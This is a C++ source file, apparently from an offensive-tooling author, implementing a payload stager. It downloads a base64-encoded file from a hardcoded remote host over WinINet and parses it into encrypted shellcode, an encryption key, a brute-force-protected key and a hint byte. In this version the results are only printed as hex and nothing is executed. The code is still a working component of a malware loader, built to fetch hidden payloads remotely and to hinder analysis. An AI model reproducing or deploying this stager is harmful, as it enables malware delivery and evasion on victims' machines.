// Dynamic_Payload_Stager.cpp
// Made by WafflesExploits
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <iostream>
using namespace std;
#pragma comment(lib, "wininet.lib")

// --Payload Staging--
#define NUM_VARIABLES 4 // Number of different variables to process
#define FILE_URL "http://192.168.153.136:8080/payload" // URL of the file to be downloaded
#define DELIMITER "-" // Delimiter to be used

// Order Values
// 1 - Shellcode
// 2 - Encryption Key
// 3 - Protected Key for brute-force
// 4 - Hint Byte


// Function to download a file using HTTP and WinINet API and store its content in a dynamically allocated C-style string
bool DownloadFileToCString(const std::string& url, char** downloadedContent) {
   // Open an internet session
   HINTERNET hInternetSession = InternetOpen(L"WinINetFileDownload", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
   if (hInternetSession == NULL) {
      cout << "InternetOpen failed. Error:" << GetLastError() << endl;
      return false;
   }

   // Open the URL
   HINTERNET hConnection = InternetOpenUrl(hInternetSession, std::wstring(url.begin(), url.end()).c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
   if (hConnection == NULL) {
      cout << "InternetOpenUrl failed. Error:" << GetLastError() << endl;
      InternetCloseHandle(hInternetSession);
      return false;
   }

   const int READ_BUFFER_SIZE = 4096; // Size of the buffer to read data from the internet
   char readBuffer[READ_BUFFER_SIZE];
   DWORD bytesRead = 0;
   size_t totalDownloadedSize = 0;
   *downloadedContent = (char*)malloc(1); // Allocate initial memory for the content
   (*downloadedContent)[0] = '\0'; // Initialize with an empty string

   // Read data dynamically from the URL and append it to the content string
   while (InternetReadFile(hConnection, readBuffer, READ_BUFFER_SIZE, &bytesRead) && bytesRead > 0) {
      char* newDownloadedContent = (char*)realloc(*downloadedContent, totalDownloadedSize + bytesRead + 1); // Allocate more memory
      if (newDownloadedContent == NULL) {
         cout << "[!] Memory allocation failed." << endl;
         free(*downloadedContent);
         InternetCloseHandle(hConnection);
         InternetCloseHandle(hInternetSession);
         return false;
      }

      *downloadedContent = newDownloadedContent;
      memcpy(*downloadedContent + totalDownloadedSize, readBuffer, bytesRead); // Append new data to the content
      totalDownloadedSize += bytesRead;
      (*downloadedContent)[totalDownloadedSize] = '\0'; // Null-terminate the string
   }

   // Close internet handles
   InternetCloseHandle(hConnection);
   InternetCloseHandle(hInternetSession);

   return true;
}

//--------------------------
// Extract specific value from a delimited string
//--------------------------
// Separates by "-" delimiter and returns every second token
char* ExtractValueByDelimiter(char* inputString) {
   // Returns the first token 
   char* token = strtok(inputString, DELIMITER);
   int tokenIndex = 1;

   // Keep extracting tokens while the delimiter is found
   while (token != NULL) {
      if ((tokenIndex % 2) == 0) {
         return token; // Return token if index is even
      }
      token = strtok(NULL, DELIMITER);
      tokenIndex++;
   }
   return nullptr; // Return nullptr if no valid token is found
}

// Print data in hexadecimal format
VOID PrintHexData(LPCSTR name, PBYTE hexData, size_t numElements) {
   cout << "[+] " << name << ": \n";
   cout << "unsigned char " << name << "[" << numElements << "] = {";

   for (long int i = 0; i < numElements; i++) {
      printf("0x%02X", hexData[i]);
      if (i < numElements - 1) {
         printf(",");
      }
      if ((i + 1) % 16 == 0) { cout << endl; } // Print a newline every 16 elements
   }

   cout << "}\n";
}

// Convert a comma-separated hex string to byte array
unsigned char* ConvertHexStringToByteArray(char* hexString, SIZE_T* byteArraySize) {
   SIZE_T elementCount = 0;
   PBYTE byteArray = NULL;
   BYTE singleByte = 0;

   // Returns first token 
   char* token = strtok(hexString, ",");
   while (token != NULL) {
      elementCount++;

      // Allocate or reallocate memory for the byte array
      if (byteArray == NULL) {
         byteArray = (PBYTE)LocalAlloc(LPTR, elementCount);
      }
      else {
         byteArray = (PBYTE)LocalReAlloc(byteArray, elementCount, LMEM_MOVEABLE | LMEM_ZEROINIT);
      }

      if (byteArray == NULL) {
         printf("[!] Failed to allocate memory for byte array.\n");
         return NULL;
      }

      // Convert string "0x01" to an integer value, Convert the int value to hexadecimal
      singleByte = static_cast<unsigned char>(strtol(token + 2, nullptr, 16));
      byteArray[elementCount - 1] = singleByte; // Store the byte in the array

      token = strtok(NULL, ",");
   }

   // Save the size of the resulting byte array
   *byteArraySize = elementCount;
   return byteArray;
}

// Separate a string into an array of strings by newline character
char** SplitStringByNewLine(char* inputString) {
   char* token = strtok(inputString, "\n");
   char** linesArray = (char**)malloc(NUM_VARIABLES * sizeof(char*));
   SIZE_T lineLength;
   int lineIndex = 0;

   // Keep extracting lines until the end of the string
   while (token != NULL) {
      // Allocate memory for each line and copy the line into the array
      lineLength = strlen(token) + 1; // Including null terminator
      linesArray[lineIndex] = (char*)malloc(lineLength);

      if (linesArray[lineIndex] == nullptr) {
         printf("[!] Failed to allocate memory for line.\n");
         return NULL;
      }

      strcpy(linesArray[lineIndex], token);
      token = strtok(NULL, "\n");
      lineIndex++;
   }

   return linesArray;
}


// Base64 Decode Functions
static const int B64index[256] = { 0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0, 62, 63, 62, 62, 63, 52, 53, 54, 55,
56, 57, 58, 59, 60, 61,  0,  0,  0,  0,  0,  0,  0,  0,  1,  2,  3,  4,  5,  6,
7,  8,  9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,  0,
0,  0,  0, 63,  0, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51 };

char* b64decode(const void* data, const size_t len) {
   unsigned char* p = (unsigned char*)data;
   int pad = len > 0 && (len % 4 || p[len - 1] == '=');
   const size_t L = ((len + 3) / 4 - pad) * 4;

   // Allocate memory for the decoded string
   char* str = (char*)malloc(L / 4 * 3 + pad + 1); // +1 for null terminator
   if (str == nullptr) {
      printf("[!] str was null.");
      return nullptr; // Return null if memory allocation fails
   }

   size_t j = 0;
   for (size_t i = 0; i < L; i += 4) {
      int n = B64index[p[i]] << 18 | B64index[p[i + 1]] << 12 | B64index[p[i + 2]] << 6 | B64index[p[i + 3]];
      str[j++] = n >> 16;
      str[j++] = n >> 8 & 0xFF;
      str[j++] = n & 0xFF;
   }

   if (pad) {
      int n = B64index[p[L]] << 18 | B64index[p[L + 1]] << 12;
      str[j++] = n >> 16;

      if (len > L + 2 && p[L + 2] != '=') {
         n |= B64index[p[L + 2]] << 6;
         str[j++] = n >> 8 & 0xFF;
      }
   }

   // Null-terminate the C-style string
   str[j] = '\0';

   return str;
}

BOOL Get_Payload_From_Url(OUT PBYTE* Encrypted_Shellcode, OUT PBYTE* Encrypted_Key, OUT PBYTE* Protected_Key_for_bruteforce, OUT BYTE* Hint_Byte, SIZE_T* shellcode_size, SIZE_T* key_size, SIZE_T* Protected_Key_for_bruteforce_size) {
   char* downloadedContent = nullptr;
   SIZE_T HintByte_size = 0, downloadedContent_size = 0;
   
   // Download file content from URL
   if (DownloadFileToCString(FILE_URL, &downloadedContent)) {
      printf("[i] File downloaded successfully.\n");
      //printf("[i] Downloaded content: %s.\n", downloadedContent);
   }
   else {
      printf("[!] Failed to download file.\n");
      return false;
   }
   
   // Get downloadContent Size
   downloadedContent_size = strlen(downloadedContent);
   
   // Call the b64decode function
   char* decoded_str = b64decode(downloadedContent, downloadedContent_size);
   // Free the allocated memory
   free(downloadedContent);
   // Check if decoding was successful
   if (decoded_str == nullptr) {
      printf("[!] base64decode Memory allocation failed!\n");
      return false;
   }

   // Separate downloaded content by newline
   char** separatedLines = SplitStringByNewLine(decoded_str);
   // Free decoded_str
   free(decoded_str);
   // Check if SplitStrinByNewLine was successful
   if (separatedLines == NULL) {
      printf("[!] Failed to separate lines from downloaded content.\n");
      return false;
   }

   // Convert to Hexadecimal and store in the variables
   *Encrypted_Shellcode = ConvertHexStringToByteArray(ExtractValueByDelimiter(separatedLines[0]), shellcode_size);
   *Encrypted_Key = ConvertHexStringToByteArray(ExtractValueByDelimiter(separatedLines[1]), key_size);
   *Protected_Key_for_bruteforce = ConvertHexStringToByteArray(ExtractValueByDelimiter(separatedLines[2]), Protected_Key_for_bruteforce_size);
   *Hint_Byte = *ConvertHexStringToByteArray(ExtractValueByDelimiter(separatedLines[3]), &HintByte_size);

   // Check if ConvertHexStringToByteArray was successful
   if (*Encrypted_Shellcode == NULL || *Encrypted_Key == NULL || *Protected_Key_for_bruteforce == NULL || *Hint_Byte == NULL) {
      printf("[!] Failed at ConvertHexStringToByteArray.");
      return false;
   }

   // Free SeparatedLines variable
   for (int i = 0; i < NUM_VARIABLES; ++i) {
      free(separatedLines[i]);
   }
   
   return true;
}

int main() {
   SIZE_T shellcode_size = 0;
   SIZE_T key_size = 0;
   SIZE_T Protected_Key_for_bruteforce_size = 0;
   unsigned char* Encrypted_Shellcode, *Encrypted_Key, *Protected_Key_for_bruteforce;
   BYTE Hint_Byte;

   if (!Get_Payload_From_Url(&Encrypted_Shellcode, &Encrypted_Key, &Protected_Key_for_bruteforce, &Hint_Byte, &shellcode_size, &key_size, &Protected_Key_for_bruteforce_size)) {
      printf("[!] Failed at Get_Payload_From_Url.");
      return -1;
   }
   
   // Print Variables as hex data
   PrintHexData("Encrypted_Shellcode", Encrypted_Shellcode, shellcode_size);
   PrintHexData("Encrypted_Key", Encrypted_Key, key_size);
   PrintHexData("Protected_Key_for_bruteforce", Protected_Key_for_bruteforce, Protected_Key_for_bruteforce_size);
   printf("[i] Hint Byte: 0x%02X\n", Hint_Byte);

   // Free allocated memory
   LocalFree(Encrypted_Shellcode);
   LocalFree(Encrypted_Key);
   LocalFree(Protected_Key_for_bruteforce);
   return 0;
}
